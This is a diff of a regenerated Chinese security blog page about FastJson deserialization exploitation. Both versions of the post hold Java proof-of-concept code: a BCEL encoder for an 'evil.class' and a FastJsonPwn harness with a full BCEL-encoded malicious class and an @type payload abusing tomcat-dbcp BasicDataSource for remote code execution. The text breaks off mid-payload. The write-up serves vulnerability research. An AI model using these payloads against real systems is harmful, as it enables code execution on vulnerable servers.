@@ -6,10 +6,10 @@
 
 
 <html class="theme-next muse use-motion" lang="zh-Hans">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <script>
     (function(){
         if(''){
@@ -28,8 +28,8 @@
 
 
 
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
 
 
 
@@ -47,7 +47,7 @@
 
   
   
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
 
 
 
@@ -81,23 +81,23 @@
 
 
 
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
 
-<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
-
-
-  <meta name="keywords" content="java安全 RCE," />
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css">
 
 
-
-
-
-  <link rel="alternate" href="/atom.xml" title="M0rk's Blog" type="application/atom+xml" />
+  <meta name="keywords" content="java安全 RCE,">
 
 
 
 
-  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.1" />
+
+  <link rel="alternate" href="/atom.xml" title="M0rk's Blog" type="application/atom+xml">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.1">
 
 
 
@@ -109,8 +109,9 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="FastJson反序列化漏洞(续)">
 <meta property="og:url" content="http://kevien.github.io/2018/06/18/FastJson反序列化漏洞(续)/index.html">
-<meta property="og:site_name" content="M0rk's Blog">
+<meta property="og:site_name" content="M0rk&#39;s Blog">
 <meta property="og:description" content="TL;DR 之前写了篇fastjson反序列化漏洞的分析文章，见Fastjson反序列化漏洞研究,最近读了这篇文章DefineClass在Java反序列化当中的利用深受启发，学习到了另外的利用姿势.本来很早就应该填的坑，因为一些其它事情导致现在才更 :( 作者文章写的很好，只是有些点以及代码没有完全给出来，所以需要自己去测试。details 在上面的文章中作者是利用了tomcat-dbcp.jar">
+<meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://kevien.github.io/2018/06/18/FastJson反序列化漏洞(续)/pwn.png">
 <meta property="og:image" content="http://kevien.github.io/2018/06/18/FastJson反序列化漏洞(续)/denylist.png">
 <meta property="og:image" content="http://kevien.github.io/2018/06/18/FastJson反序列化漏洞(续)/calculatehash.png">
@@ -146,7 +147,7 @@
 
 
 
-  <link rel="canonical" href="http://kevien.github.io/2018/06/18/FastJson反序列化漏洞(续)/"/>
+  <link rel="canonical" href="http://kevien.github.io/2018/06/18/FastJson反序列化漏洞(续)/">
 
 
 
@@ -155,7 +156,7 @@
   <title>FastJson反序列化漏洞(续) | M0rk's Blog</title>
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
   
 
@@ -180,13 +181,13 @@
   <div class="container sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
       <div class="header-inner"><div class="site-brand-wrapper">
   <div class="site-meta ">
     
 
     <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
+      <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
         <span class="site-title">M0rk's Blog</span>
         <span class="logo-line-after"><i></i></span>
@@ -216,7 +217,7 @@
         <li class="menu-item menu-item-home">
           <a href="/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
             
             首页
           </a>
@@ -226,7 +227,7 @@
         <li class="menu-item menu-item-archives">
           <a href="/archives" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
             
             归档
           </a>
@@ -236,7 +237,7 @@
         <li class="menu-item menu-item-tags">
           <a href="/tags" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
             
             标签
           </a>
@@ -246,7 +247,7 @@
         <li class="menu-item menu-item-about">
           <a href="/about" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
             
             关于
           </a>
@@ -256,7 +257,7 @@
         <li class="menu-item menu-item-sitemap">
           <a href="/sitemap.xml" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
             
             站点地图
           </a>
@@ -269,7 +270,7 @@
             <a href="javascript:;" class="popup-trigger">
           
             
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
             
             搜索
           </a>
@@ -290,9 +291,7 @@
       <i class="fa fa-times-circle"></i>
     </span>
     <div class="local-search-input-wrapper">
-      <input autocapitalize="off" autocomplete="off" autocorrect="off"
-             placeholder="搜索..." spellcheck="false"
-             type="text" id="local-search-input">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
     </div>
   </div>
   <div id="local-search-result"></div>
@@ -324,16 +323,16 @@
   
   
 
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2018/06/18/FastJson反序列化漏洞(续)/">
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="M0rk">
       <meta itemprop="description" content="">
       <meta itemprop="image" content="/uploads/avatar.jpg">
     </span>
 
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="M0rk's Blog">
     </span>
 
@@ -428,30 +427,30 @@
 
       
         <h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
-<li>之前写了篇fastjson反序列化漏洞的分析文章，见<a href="https://www.cnblogs.com/mrchang/p/6789060.html" target="_blank" rel="external">Fastjson反序列化漏洞研究</a>,最近<br>读了这篇文章<a href="http://www.freebuf.com/articles/others-articles/167932.html" target="_blank" rel="external">DefineClass在Java反序列化当中的利用</a>深受启发，学习到了另外的利用姿势.本来很早就应该填的坑，因为一些其它事情导致现在才更 :(</li>
+<li>之前写了篇fastjson反序列化漏洞的分析文章，见<a href="https://www.cnblogs.com/mrchang/p/6789060.html" target="_blank" rel="noopener">Fastjson反序列化漏洞研究</a>,最近<br>读了这篇文章<a href="http://www.freebuf.com/articles/others-articles/167932.html" target="_blank" rel="noopener">DefineClass在Java反序列化当中的利用</a>深受启发，学习到了另外的利用姿势.本来很早就应该填的坑，因为一些其它事情导致现在才更 :(</li>
 <li>作者文章写的很好，只是有些点以及代码没有完全给出来，所以需要自己去测试。<h4 id="details"><a href="#details" class="headerlink" title="details"></a>details</h4></li>
-<li>在上面的文章中作者是利用了tomcat-dbcp.jar组件中org.apache.tomcat.dbcp.dbcp.BasicDataSource类的Class.forName()方法，关于Class.forName执行代码的方法，有两种（作者也在文章中介绍了），这个Class.forName是关键，它可以设置classLoader和classname，从而加载.class文件，恶意的.class中静态代码块儿static{}会执行。下面给出文章中一些缺少的代码。关于ClassLoader的机制可以参考@frozenme大佬的文章(很棒)：P<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">package FastJsonDemo;</div><div class="line">import com.sun.org.apache.bcel.internal.classfile.Utility;</div><div class="line"></div><div class="line">import java.nio.file.Files;</div><div class="line">import java.nio.file.Path;</div><div class="line">import java.nio.file.Paths;</div><div class="line"></div><div class="line">public class BCELencode &#123;</div><div class="line">    public static void main(String []args) throws Exception&#123;</div><div class="line">        //There also should be compiled class file,not java file</div><div class="line">        Path path = Paths.get(&quot;/Users/m0rk/Desktop/tmp/untitled/src/FastJsonDemo/evil.class&quot;);</div><div class="line">        byte[] data = Files.readAllBytes(path);</div><div class="line">        String s =  Utility.encode(data,true);</div><div class="line">        System.out.print(s);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<li>在上面的文章中作者是利用了tomcat-dbcp.jar组件中org.apache.tomcat.dbcp.dbcp.BasicDataSource类的Class.forName()方法，关于Class.forName执行代码的方法，有两种（作者也在文章中介绍了），这个Class.forName是关键，它可以设置classLoader和classname，从而加载.class文件，恶意的.class中静态代码块儿static{}会执行。下面给出文章中一些缺少的代码。关于ClassLoader的机制可以参考@frozenme大佬的文章(很棒)：P<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">package FastJsonDemo;</span><br><span class="line">import com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"></span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Path;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line">public class BCELencode &#123;</span><br><span class="line">    public static void main(String []args) throws Exception&#123;</span><br><span class="line">        //There also should be compiled class file,not java file</span><br><span class="line">        Path path = Paths.get(&quot;/Users/m0rk/Desktop/tmp/untitled/src/FastJsonDemo/evil.class&quot;);</span><br><span class="line">        byte[] data = Files.readAllBytes(path);</span><br><span class="line">        String s =  Utility.encode(data,true);</span><br><span class="line">        System.out.print(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 <p>这里用于将evil.class文件进行BCEL编码。</p>
 <ul>
 <li><p>在作者的poc的基础上精简了一下，直接读取并反序列化外部json文件触发漏洞。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">package FastJsonDemo;</div><div class="line"></div><div class="line">import com.alibaba.fastjson.JSON;</div><div class="line">import com.sun.org.apache.bcel.internal.util.ClassLoader;</div><div class="line">import jdk.internal.dynalink.support.TypeUtilities;</div><div class="line"></div><div class="line">import java.io.IOException;</div><div class="line">import java.io.InputStream;</div><div class="line">import java.io.InputStreamReader;</div><div class="line">import java.io.FileInputStream;</div><div class="line">import java.io.BufferedReader;</div><div class="line"></div><div class="line"></div><div class="line">public class FastJsonPwn  &#123;</div><div class="line"></div><div class="line">    public static void readToBuffer(StringBuffer buffer, String filePath) throws IOException &#123;</div><div class="line">        InputStream is = new FileInputStream(filePath);</div><div class="line">        String line; // 用来保存每行读取的内容</div><div class="line">        BufferedReader reader = new BufferedReader(new InputStreamReader(is));</div><div class="line">        line = reader.readLine(); // 读取第一行</div><div class="line">        while (line != null) &#123; // 如果 line 为空说明读完了</div><div class="line">            buffer.append(line); // 将读到的内容添加到 buffer 中</div><div class="line">            buffer.append(&quot;\n&quot;); // 添加换行符</div><div class="line">            line = reader.readLine(); // 读取下一行</div><div class="line">        &#125;</div><div class="line">        reader.close();</div><div class="line">        is.close();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static void main(String[] args) throws Exception&#123;</div><div class="line">        String s = &quot;java.lang.Thread&quot;;</div><div class="line">        //long hash = TypeUtilities.fnv1a_64(s);</div><div class="line"></div><div class="line">        //Class.forName(&quot;FastJsonDemo.Run&quot;);</div><div class="line"></div><div class="line">//        String classname = &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$Q$fe$ce$deZJq$97$C$a2$e0$F$Qq$Xe$eb$V$_$m$8a$Lh$b2h$8c$r$90$V$ff$9c$z$tP$ed$b6$b5$3d$cb$e5Q$7c$C$S$ff$n$J$Q$8d$3e$80$Pe$9c6$h$40$dc$3fg$ce$f9$e6$9b$99o$a6$d3$df$7f$be$ff$Cp$l$af4$f4aT$c1u$N$v$8cv$d01$a6$e2Fl$8b$wJ$g$c6qS$83$8e$5b$w$sb$5bV$60$aa$b8$ad$e2$8e$8a$bb$w$eei$94$e2A$7cL$wx$a8$a1$H$8f$U$3cf$c8$c9$8dP$f05$Gc$f1$p$df$e4$a6$cb$bdus$v$c1$a6$Y$d2v$e3$8c$cb$92$a1$e3$ad$93$x7$edx$8e$9c$nN$b1$b4$cc$90$a9$f8k$82$n$bf$e8x$e2M$b3Q$X$e1$S$af$bb$84$a8$d3$b6$dbbvY$92$db$9f$5e$f3$mq$vxBJ$Y4$cbo$86$b6Xpbv$87$d8t$dcr$5cN$c7$A$G$J$98$T$N$df$8cQ$j$e7$d1$cf0$ec$H$c2$h2g$83$c0ul$$$j$df$8b$cc$Kw$ed$a6$cb$a5$l$96y$Q$e8$b8$80$8b$M$8a$l$95$3d$de$a0$3aS$3a$a6$f1T$c7$M$9e$91$dc$z$c7$d3$f1$i$b3$M$85$b3mQ$Q5$5c$W$db$a4$qe$daT$dd$ac$3b$9eY$e7$d1$G$B$T$b6$82$X$3a$w$98$d31$8f$F$86$9e$93$f8$f9m$5b$E$b1$Y$j$_c$d9$85$b3$c3$q$f6j$bb1$9e$d6$b0$TI$d1$60$e8$5c$X$f2mHm$86r$87a$ac$f8$7fX$a9$5d$a6N$e9$_$fa$5b$o$ac$f0$88$e4$f7$W$db$92T$db$f7$qw$bc$88a$f0t$e2$ca$G$P$z$f1$b9$v$3c$5bL$95$de3t$9f$f8$de5$3d$e94$u$a7F$c2$8e$l$7d$ff$Uh$c1T$nC$d3$a3$c9$V$8bm$da$3d$jA$j$da$o$8a$u$o$l$90S$s$bb$b1$Ur$5b$60$98v$ba$8fv$3e$F$z$fe$e6t$d3$e2O$9a$m$y$5e$L$3a$_$d1$eb2YF6$3b$7e$I$b6G$XF$Q$90K$c04T$5c9$a6$7eE$sA$3f$fc$40$aav$88$f4$3e2Fv$l9C9$82z$80$OC$3b$40$e7$X$M$e4$7eB$af$a5$8d$$$ab$961$ceY$b5$ec7$e4$ac$5d$f4$b7$e0$7c$M$XZp$f5$I$dd$e3$H0Vv$a1V$e9$d2$bbG$V$f2$b0$b0L$3fW$wQ2B$g$40$955d$c9$a3$a1$8a$$$f2w$T$p$8f$V$U$b0J$cc$ab$c4$d0$91$99$b4$U$MU$V$M$c7$3aG$92V$af$fd$F$N$5c$a2N$fb$D$A$A&quot;;</div><div class="line">//        ClassLoader cls = new com.sun.org.apache.bcel.internal.util.ClassLoader();</div><div class="line">//        Class.forName(classname, true, cls);</div><div class="line">        //note  project must contain dbcp external lib</div><div class="line">//        String poc = &quot; &#123;\n&quot; +</div><div class="line">//                &quot;\t\t\t\&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource\&quot;,\n&quot; +</div><div class="line">//                &quot;\t\t\t\&quot;driverClassLoader\&quot;: &#123;\n&quot; +</div><div class="line">//                &quot;\t\t\t\t\&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot; +</div><div class="line">//                &quot;\t\t\t&#125;,\n&quot; +</div><div class="line">//                &quot;\t\t\t\&quot;driverClassName\&quot;: \&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$Q$fe$ce$deZJq$97$C$a2$e0$F$Qq$Xe$eb$V$_$m$8a$Lh$b2h$8c$r$90$V$ff$9c$z$tP$ed$b6$b5$3d$cb$e5Q$7c$C$S$ff$n$J$Q$8d$3e$80$Pe$9c6$h$40$dc$3fg$ce$f9$e6$9b$99o$a6$d3$df$7f$be$ff$Cp$l$af4$f4aT$c1u$N$v$8cv$d01$a6$e2Fl$8b$wJ$g$c6qS$83$8e$5b$w$sb$5bV$60$aa$b8$ad$e2$8e$8a$bb$w$eei$94$e2A$7cL$wx$a8$a1$H$8f$U$3cf$c8$c9$8dP$f05$Gc$f1$p$df$e4$a6$cb$bdus$v$c1$a6$Y$d2v$e3$8c$cb$92$a1$e3$ad$93$x7$edx$8e$9c$nN$b1$b4$cc$90$a9$f8k$82$n$bf$e8x$e2M$b3Q$X$e1$S$af$bb$84$a8$d3$b6$dbbvY$92$db$9f$5e$f3$mq$vxBJ$Y4$cbo$86$b6Xpbv$87$d8t$dcr$5cN$c7$A$G$J$98$T$N$df$8cQ$j$e7$d1$cf0$ec$H$c2$h2g$83$c0ul$$$j$df$8b$cc$Kw$ed$a6$cb$a5$l$96y$Q$e8$b8$80$8b$M$8a$l$95$3d$de$a0$3aS$3a$a6$f1T$c7$M$9e$91$dc$z$c7$d3$f1$i$b3$M$85$b3mQ$Q5$5c$W$db$a4$qe$daT$dd$ac$3b$9eY$e7$d1$G$B$T$b6$82$X$3a$w$98$d31$8f$F$86$9e$93$f8$f9m$5b$E$b1$Y$j$_c$d9$85$b3$c3$q$f6j$bb1$9e$d6$b0$TI$d1$60$e8$5c$X$f2mHm$86r$87a$ac$f8$7fX$a9$5d$a6N$e9$_$fa$5b$o$ac$f0$88$e4$f7$W$db$92T$db$f7$qw$bc$88a$f0t$e2$ca$G$P$z$f1$b9$v$3c$5bL$95$de3t$9f$f8$de5$3d$e94$u$a7F$c2$8e$l$7d$ff$Uh$c1T$nC$d3$a3$c9$V$8bm$da$3d$jA$j$da$o$8a$u$o$l$90S$s$bb$b1$Ur$5b$60$98v$ba$8fv$3e$F$z$fe$e6t$d3$e2O$9a$m$y$5e$L$3a$_$d1$eb2YF6$3b$7e$I$b6G$XF$Q$90K$c04T$5c9$a6$7eE$sA$3f$fc$40$aav$88$f4$3e2Fv$l9C9$82z$80$OC$3b$40$e7$X$M$e4$7eB$af$a5$8d$$$ab$961$ceY$b5$ec7$e4$ac$5d$f4$b7$e0$7c$M$XZp$f5$I$dd$e3$H0Vv$a1V$e9$d2$bbG$V$f2$b0$b0L$3fW$wQ2B$g$40$955d$c9$a3$a1$8a$$$f2w$T$p$8f$V$U$b0J$cc$ab$c4$d0$91$99$b4$U$MU$V$M$c7$3aG$92V$af$fd$F$N$5c$a2N$fb$D$A$A\&quot;\n&quot; +</div><div class="line">//                &quot;\t\t&#125;\n&quot;;</div><div class="line">        StringBuffer Buffer = new StringBuffer();</div><div class="line">        FastJsonPwn.readToBuffer(Buffer,&quot;/Users/m0rk/Desktop/tmp/untitled/src/FastJsonDemo/evil.json&quot;);</div><div class="line">        Object obj= JSON.parseObject(Buffer.toString());</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">package FastJsonDemo;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line">import jdk.internal.dynalink.support.TypeUtilities;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class FastJsonPwn  &#123;</span><br><span class="line"></span><br><span class="line">    public static void readToBuffer(StringBuffer buffer, String filePath) throws IOException &#123;</span><br><span class="line">        InputStream is = new FileInputStream(filePath);</span><br><span class="line">        String line; // 用来保存每行读取的内容</span><br><span class="line">        BufferedReader reader = new BufferedReader(new InputStreamReader(is));</span><br><span class="line">        line = reader.readLine(); // 读取第一行</span><br><span class="line">        while (line != null) &#123; // 如果 line 为空说明读完了</span><br><span class="line">            buffer.append(line); // 将读到的内容添加到 buffer 中</span><br><span class="line">            buffer.append(&quot;\n&quot;); // 添加换行符</span><br><span class="line">            line = reader.readLine(); // 读取下一行</span><br><span class="line">        &#125;</span><br><span class="line">        reader.close();</span><br><span class="line">        is.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        String s = &quot;java.lang.Thread&quot;;</span><br><span class="line">        //long hash = TypeUtilities.fnv1a_64(s);</span><br><span class="line"></span><br><span class="line">        //Class.forName(&quot;FastJsonDemo.Run&quot;);</span><br><span class="line"></span><br><span class="line">//        String classname = &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$Q$fe$ce$deZJq$97$C$a2$e0$F$Qq$Xe$eb$V$_$m$8a$Lh$b2h$8c$r$90$V$ff$9c$z$tP$ed$b6$b5$3d$cb$e5Q$7c$C$S$ff$n$J$Q$8d$3e$80$Pe$9c6$h$40$dc$3fg$ce$f9$e6$9b$99o$a6$d3$df$7f$be$ff$Cp$l$af4$f4aT$c1u$N$v$8cv$d01$a6$e2Fl$8b$wJ$g$c6qS$83$8e$5b$w$sb$5bV$60$aa$b8$ad$e2$8e$8a$bb$w$eei$94$e2A$7cL$wx$a8$a1$H$8f$U$3cf$c8$c9$8dP$f05$Gc$f1$p$df$e4$a6$cb$bdus$v$c1$a6$Y$d2v$e3$8c$cb$92$a1$e3$ad$93$x7$edx$8e$9c$nN$b1$b4$cc$90$a9$f8k$82$n$bf$e8x$e2M$b3Q$X$e1$S$af$bb$84$a8$d3$b6$dbbvY$92$db$9f$5e$f3$mq$vxBJ$Y4$cbo$86$b6Xpbv$87$d8t$dcr$5cN$c7$A$G$J$98$T$N$df$8cQ$j$e7$d1$cf0$ec$H$c2$h2g$83$c0ul$$$j$df$8b$cc$Kw$ed$a6$cb$a5$l$96y$Q$e8$b8$80$8b$M$8a$l$95$3d$de$a0$3aS$3a$a6$f1T$c7$M$9e$91$dc$z$c7$d3$f1$i$b3$M$85$b3mQ$Q5$5c$W$db$a4$qe$daT$dd$ac$3b$9eY$e7$d1$G$B$T$b6$82$X$3a$w$98$d31$8f$F$86$9e$93$f8$f9m$5b$E$b1$Y$j$_c$d9$85$b3$c3$q$f6j$bb1$9e$d6$b0$TI$d1$60$e8$5c$X$f2mHm$86r$87a$ac$f8$7fX$a9$5d$a6N$e9$_$fa$5b$o$ac$f0$88$e4$f7$W$db$92T$db$f7$qw$bc$88a$f0t$e2$ca$G$P$z$f1$b9$v$3c$5bL$95$de3t$9f$f8$de5$3d$e94$u$a7F$c2$8e$l$7d$ff$Uh$c1T$nC$d3$a3$c9$V$8bm$da$3d$jA$j$da$o$8a$u$o$l$90S$s$bb$b1$Ur$5b$60$98v$ba$8fv$3e$F$z$fe$e6t$d3$e2O$9a$m$y$5e$L$3a$_$d1$eb2YF6$3b$7e$I$b6G$XF$Q$90K$c04T$5c9$a6$7eE$sA$3f$fc$40$aav$88$f4$3e2Fv$l9C9$82z$80$OC$3b$40$e7$X$M$e4$7eB$af$a5$8d$$$ab$961$ceY$b5$ec7$e4$ac$5d$f4$b7$e0$7c$M$XZp$f5$I$dd$e3$H0Vv$a1V$e9$d2$bbG$V$f2$b0$b0L$3fW$wQ2B$g$40$955d$c9$a3$a1$8a$$$f2w$T$p$8f$V$U$b0J$cc$ab$c4$d0$91$99$b4$U$MU$V$M$c7$3aG$92V$af$fd$F$N$5c$a2N$fb$D$A$A&quot;;</span><br><span class="line">//        ClassLoader cls = new com.sun.org.apache.bcel.internal.util.ClassLoader();</span><br><span class="line">//        Class.forName(classname, true, cls);</span><br><span class="line">        //note  project must contain dbcp external lib</span><br><span class="line">//        String poc = &quot; &#123;\n&quot; +</span><br><span class="line">//                &quot;\t\t\t\&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource\&quot;,\n&quot; +</span><br><span class="line">//                &quot;\t\t\t\&quot;driverClassLoader\&quot;: &#123;\n&quot; +</span><br><span class="line">//                &quot;\t\t\t\t\&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot; +</span><br><span class="line">//                &quot;\t\t\t&#125;,\n&quot; +</span><br><span class="line">//                &quot;\t\t\t\&quot;driverClassName\&quot;: \&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$Q$fe$ce$deZJq$97$C$a2$e0$F$Qq$Xe$eb$V$_$m$8a$Lh$b2h$8c$r$90$V$ff$9c$z$tP$ed$b6$b5$3d$cb$e5Q$7c$C$S$ff$n$J$Q$8d$3e$80$Pe$9c6$h$40$dc$3fg$ce$f9$e6$9b$99o$a6$d3$df$7f$be$ff$Cp$l$af4$f4aT$c1u$N$v$8cv$d01$a6$e2Fl$8b$wJ$g$c6qS$83$8e$5b$w$sb$5bV$60$aa$b8$ad$e2$8e$8a$bb$w$eei$94$e2A$7cL$wx$a8$a1$H$8f$U$3cf$c8$c9$8dP$f05$Gc$f1$p$df$e4$a6$cb$bdus$v$c1$a6$Y$d2v$e3$8c$cb$92$a1$e3$ad$93$x7$edx$8e$9c$nN$b1$b4$cc$90$a9$f8k$82$n$bf$e8x$e2M$b3Q$X$e1$S$af$bb$84$a8$d3$b6$dbbvY$92$db$9f$5e$f3$mq$vxBJ$Y4$cbo$86$b6Xpbv$87$d8t$dcr$5cN$c7$A$G$J$98$T$N$df$8cQ$j$e7$d1$cf0$ec$H$c2$h2g$83$c0ul$$$j$df$8b$cc$Kw$ed$a6$cb$a5$l$96y$Q$e8$b8$80$8b$M$8a$l$95$3d$de$a0$3aS$3a$a6$f1T$c7$M$9e$91$dc$z$c7$d3$f1$i$b3$M$85$b3mQ$Q5$5c$W$db$a4$qe$daT$dd$ac$3b$9eY$e7$d1$G$B$T$b6$82$X$3a$w$98$d31$8f$F$86$9e$93$f8$f9m$5b$E$b1$Y$j$_c$d9$85$b3$c3$q$f6j$bb1$9e$d6$b0$TI$d1$60$e8$5c$X$f2mHm$86r$87a$ac$f8$7fX$a9$5d$a6N$e9$_$fa$5b$o$ac$f0$88$e4$f7$W$db$92T$db$f7$qw$bc$88a$f0t$e2$ca$G$P$z$f1$b9$v$3c$5bL$95$de3t$9f$f8$de5$3d$e94$u$a7F$c2$8e$l$7d$ff$Uh$c1T$nC$d3$a3$c9$V$8bm$da$3d$jA$j$da$o$8a$u$o$l$90S$s$bb$b1$Ur$5b$60$98v$ba$8fv$3e$F$z$fe$e6t$d3$e2O$9a$m$y$5e$L$3a$_$d1$eb2YF6$3b$7e$I$b6G$XF$Q$90K$c04T$5c9$a6$7eE$sA$3f$fc$40$aav$88$f4$3e2Fv$l9C9$82z$80$OC$3b$40$e7$X$M$e4$7eB$af$a5$8d$$$ab$961$ceY$b5$ec7$e4$ac$5d$f4$b7$e0$7c$M$XZp$f5$I$dd$e3$H0Vv$a1V$e9$d2$bbG